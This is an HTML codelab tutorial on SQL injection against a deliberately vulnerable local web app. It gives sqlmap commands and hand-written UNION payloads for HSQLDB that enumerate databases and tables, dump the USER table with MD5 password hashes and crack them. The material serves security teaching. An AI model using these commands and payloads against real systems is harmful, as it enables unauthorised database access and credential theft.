@@ -1,0 +1,218 @@
+
+<!doctype html>
+
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, user-scalable=yes">
+  <meta name="theme-color" content="#4F7DC9">
+  <meta charset="UTF-8">
+  <title>SQL Injection</title>
+  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+  <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+  <link rel="stylesheet" href="https://storage.googleapis.com/codelab-elements/codelab-elements.css">
+  <style>
+    .success {
+      color: #1e8e3e;
+    }
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+  <google-codelab codelab-gaid=""
+                  id="cyber-security-sql-injection"
+                  title="SQL Injection"
+                  environment="web"
+                  feedback-link="">
+    
+      <google-codelab-step label="Overview" duration="1">
+        <h2 class="checklist" is-upgraded>What You&#39;ll Learn</h2>
+<ul>
+<li>What is SQL Injection?</li>
+<li>How to use SQLMap to test and find vulnerabilities in the admin page.</li>
+</ul>
+<p class="image-container"><img alt="cwe-sqli" src="img/e9d68ce0e51d86bf.png"></p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Prerequisites" duration="1">
+        <ul>
+<li>Run the java file: <code>java -jar vulnerable-webapp-1.2.0.jar</code></li>
+<li>The default username is <code>jblogs</code> and the default password is <code>pa55word</code>.</li>
+<li>You will need a web browser such as firefox.</li>
+<li>You will need <code>sqlmap</code> installed.</li>
+<li>Each invocation of <code>sqlmap</code> requires the JSESSIONID of an authenticated user. Follow the section <code>Exploring the admin page</code> to find out how to find this.</li>
+</ul>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="What is SQL Injection?" duration="0">
+        <ul>
+<li>Injection of malicious SQL code which, when executed, changes the state or even the structure of the database in an undesirable way.</li>
+<li>This technique is used to attack data-driven applications (data instructions over steps or code), with SQL backend. Typically, SQL injections are used against web applications.</li>
+<li>Malicious users try to &#34;trick&#34; your code by entering special or escaped character sequences in Web forms and URLs.</li>
+<li>Significant security breaches and data losses have occurred just recently due to SQL injections and might occur in the future as a result of hackers using this technique.</li>
+</ul>
+<p>https://codecurmudgeon.com/wp/sql-injection-hall-of-shame/</p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Exploring the admin page" duration="0">
+        <ol type="1">
+<li>Navigate to <code>http://localhost:8080/user-admin</code>. Authenticate with the default username and password.</li>
+<li>Extract the JSESSIONID cookie value from the &#34;DevTools&#34; tab in the browser. For example, in Firefox from the storage tab (see fig 2). You will need this later on, every time you restart the application you will need to extract the new JSESSIONID value.</li>
+<li>You should see a table of user accounts and a search box (see fig 1).</li>
+<li>You can search for a user by entering a username in the search box. This will invoke a GET request to the <code>user-admin</code> controller with a <code>username</code> query parameter.</li>
+<li>You can also UPDATE usernames using the table below the search box. We will leave that for the time being.</li>
+<li>What happens if you search for a username with an odd syntax e.g. enter <code>'test'</code> into the search box and press the search button.  <ul>
+<li>Is the input validated?</li>
+<li>Does the system reveal/expose sensitive information?</li>
+</ul>
+</li>
+</ol>
+<p><img alt="user-admin-page" src="img/de93b198c5f9cafb.png"><strong>fig 1 - User Admin Page</strong></p>
+<p><img alt="devtools-storage-tab" src="img/2582cc9fa0cd0553.png"><strong>fig 2 - DevTools Storage Tab</strong></p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Using SQLMap to test vulnerabilities in the admin page." duration="0">
+        <p>To determine if an attack is possible on the admin page, use the following SQLMap command:</p>
+<pre><code language="language-bash" class="language-bash">sqlmap -u http://localhost:8080/user-admin\?username\=jblogs --cookie=&#39; JSESSIONID=&lt;ID&gt;&#39;
+</code></pre>
+<aside class="warning"><p>IMPORTANT: You can accept the defaults to any question asked during the attack.</p>
+</aside>
+<p>SQLMap will generate SQL queries, add them to the username parameter, and perform an HTTP Get to the /user-admin endpoint.</p>
+<aside class="special"><p>NOTE: If you want to ignore any previous runs and start fresh, use <code>--flush-session</code> e.g. <code>sqlmap --flush-session - u http://localhost:8080/user-admin\?username\=jblogs --cookie=' JSESSIONID=<ID>'</code></p>
+</aside>
+<p>This should produce a result similar (or identical) to the below:</p>
+<pre><code language="language-bash" class="language-bash">sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
+---
+Parameter: username (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=jblogs&#39; AND 2495=2495 AND &#39;mrAX&#39;=&#39;mrAX
+
+    Type: time-based blind
+    Title: HSQLDB &gt; 2.0 AND time-based blind (heavy query)
+    Payload: username=jblogs&#39; AND CHAR(117)||CHAR(69)||CHAR(86)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL) AND &#39;vARh&#39;=&#39;vARh
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: username=jblogs\&#39; UNION ALL SELECT NULL,CHAR(113)||CHAR(106)||CHAR(120)||CHAR(122)||CHAR(113)||CHAR(79)||CHAR(84)||CHAR(109)||CHAR(88)||CHAR(73)||CHAR(66)||CHAR(109)||CHAR(71)||CHAR(101)||CHAR(120)||CHAR(109)||CHAR(113)||CHAR(111)||CHAR(111)||CHAR(88)||CHAR(88)||CHAR(90)||CHAR(83)||CHAR(101)||CHAR(121)||CHAR(74)||CHAR(88)||CHAR(108)||CHAR(104)||CHAR(109)||CHAR(84)||CHAR(105)||CHAR(113)||CHAR(107)||CHAR(67)||CHAR(121)||CHAR(65)||CHAR(119)||CHAR(115)||CHAR(75)||CHAR(66)||CHAR(72)||CHAR(77)||CHAR(74)||CHAR(69)||CHAR(113)||CHAR(118)||CHAR(112)||CHAR(118)||CHAR(113),NULL,NULL FROM INFORMATION_SCHEMA.SYSTEM_USERS-- ljbB
+---
+[15:58:28] [INFO] the back-end DBMS is HSQLDB
+</code></pre>
+<p>The initial tests can determine which DBMS you&#39;re using. This can be achieved by triggering and looking for errors in the response. For example, if you injected this username into the search field:</p>
+<p><code>'test'</code></p>
+<p>You will see the stack trace contains the name of the DBMS:</p>
+<pre><code>Caused by: org.hsqldb.HsqlException: unexpected token: TEST
+          at org.hsqldb.error.Error.parseError(Unknown Source)
+          at org.hsqldb.ParserBase.unexpectedToken(Unknown Source)
+          ...
+</code></pre>
+<p>The stack trace is quite important. This is one way <code>sqlmap</code> can determine a successful attack. There are other ways, the main types are listed below:</p>
+<ol type="1">
+<li><code>boolean-based blind</code> - add a boolean condition to return 0 or all rows - should return a valid response.</li>
+<li><code>error-based</code>: Determining if the SQL is being compiled and run. As the provided SQL is invalid, it should return an error response - if the error is propagated back to the caller in the HTTP response.</li>
+<li><code>stacked-queries</code> - does the endpoint run stacked queries i.e. does it execute multiple queries separated by a <code>;</code>. This is a powerful exploit, as you can then run arbitrary commands after the semi-colon.</li>
+<li><code>time-based-blind</code> - force the database to sleep, hence the response should take that time to respond, if it does, indicates the dbms ran the query.</li>
+<li><code>union query</code> - append a UNION SELECT statement into the existing parameter, and see if it is executed. This allows joining information from <strong><em>new</em></strong> and <strong><em>arbitrary</em></strong> SELECT statements with the original SELECT statement.</li>
+</ol>
+<aside class="special"><p>NOTE: Several attacks use a concatenation of random hex characters. SQLMap looks for these strings in the response to guarantee the response is to the query it ran.</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Finding All Databases" duration="0">
+        <p>To find all databases, run the SQLMap command:</p>
+<pre><code language="language-bash" class="language-bash">sqlmap -v --dbs -u http://localhost:8080/user-admin\?username\=jblogs --cookie=&#39; JSESSIONID=&lt;ID&gt;&#39;
+</code></pre>
+<p>This should print out a list of databases to the console:</p>
+<pre><code language="language-bash" class="language-bash"> available databases [3]:
+    [ * ] INFORMATION_SCHEMA
+    [ * ] PUBLIC
+    [ * ] SYSTEM_LOBS    
+</code></pre>
+<p>HSQLDB only has one database for the user tables namely; <code>PUBLIC</code>.</p>
+<p>SQLMap does not need to understand specifics about the response format i.e. HTML. It uses hex characters as control or delimiters to indicate which part of the response it needs to extract. For example, navigate to <code>http://localhost:8080/user-admin</code> and enter the following into the search box:</p>
+<pre><code>jblogs&#39; UNION ALL SELECT
+   NULL,CHAR(113)||CHAR(122)||CHAR(120)||CHAR(118)||CHAR(113)||IFNULL(CAST(table_schem AS LONGVARCHAR),CHAR(32))||CHAR(113)||CHAR(107)||CHAR(107)||CHAR(120)||CHAR(113),NULL,NULL FROM INFORMATION_SCHEMA.SYSTEM_SCHEMAS-- vmzM 
+</code></pre>
+<p>You will see the databases are listed in the accounts table using a prefix of <code>qzxvq</code> and a suffix of <code>qkkxq</code>. It is then able to parse the databases out of the raw HTML text.</p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Finding All Tables" duration="0">
+        <p>To find all the tables in one of the returned databases (<code>PUBLIC</code> here), run the SQLMap command:</p>
+<p><code>sqlmap -v --tables -D PUBLIC -u http://localhost:8080/user-admin\?username\=jblogs --cookie=' JSESSIONID=<ID>'</code></p>
+<p>You should see an output similar to below:</p>
+<pre><code language="language-bash" class="language-bash"> [3 tables]
++------------------------+
+|   USER                 |
+|   ITEM                  |
+|   USER_ROLES  |
++-------------------------+
+</code></pre>
+<p>This attack runs several queries to discover all the possible tables in the PUBLIC database. For example, you can try this in the search box:</p>
+<pre><code>jblogs&#39; UNION ALL SELECT NULL,(SELECT LIMIT 0 1
+  CHAR(113)||CHAR(120)||CHAR(122)||CHAR(122)||CHAR(113)||IFNULL(CAST(table_name AS LONGVARCHAR),CHAR(32))||CHAR(113)||CHAR(98)||CHAR(112)||CHAR(107)||CHAR(113) FROM
+  INFORMATION_SCHEMA.SYSTEM_TABLES WHERE table_schem IN
+  (CHAR(80)||CHAR(85)||CHAR(66)||CHAR(76)||CHAR(73)||CHAR(67)) ORDER BY table_schem),NULL,NULL FROM
+  INFORMATION_SCHEMA.SYSTEM_USERS-- vDEk&#39;
+</code></pre>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Dumping Everything From A Table" duration="0">
+        <ul>
+<li>To dump all the rows of a table, run the SQLMap command:</li>
+</ul>
+<pre><code language="language-bash" class="language-bash">sqlmap --dump -T USER -D PUBLIC -u http://localhost:8080/user-admin\?username\=jblogs --cookie=&#39;JSESSIONID=&lt;ID&gt;&#39;
+</code></pre>
+<ul>
+<li>This results in the <code>USER</code> table being dumped — including passwords!</li>
+</ul>
+<pre><code language="language-bash" class="language-bash">Database: PUBLIC
+Table: USER
+[2 entries]
++-------+--------------+-----------------------------------------------------------------------+----------------------+
+|  ID   |  ENABLED   | PASSWORD                                                               |    USERNAME   |
++-------+--------------+-----------------------------------------------------------------------+----------------------+
+|   0   |  TRUE        | 5f4dcc3b5aa765d61d8327deb882cf99                        |     jblogs            |
+|   1   |  TRUE        | c50672216e6be50f327c7df719784fe3                         |     jones             |
++-------+--------------+-----------------------------------------------------------------------+----------------------+
+</code></pre>
+<ul>
+<li>You can even try crack the MD5 hashes e.g.</li>
+</ul>
+<pre><code language="language-bash" class="language-bash">sqlmap --dump -T USER -D PUBLIC --passwords -u http://localhost:8080/user-admin\?username\=jblogs --cookie=&#39;JSESSIONID=&lt;ID&gt;&#39;
+</code></pre>
+<ul>
+<li>Once you found the existing passwords, try changing the password of one of the users to a passphrase.</li>
+<li>Re-run sqlmap (using <code>--flush-sessions</code> to avoid using cached responses) and see if it can crack the new password.</li>
+</ul>
+<pre><code language="language-bash" class="language-bash">sqlmap --flush-session --dump -T USER -D PUBLIC --passwords -u http://localhost:8080/user-admin\?username\=jblogs --cookie=&#39;JSESSIONID=&lt;ID&gt;&#39;
+</code></pre>
+
+
+      </google-codelab-step>
+    
+  </google-codelab>
+
+  <script src="https://storage.googleapis.com/codelab-elements/native-shim.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/custom-elements.min.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/prettify.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/codelab-elements.js"></script>
+  <script src="//support.google.com/inapp/api.js"></script>
+
+</body>
+</html>
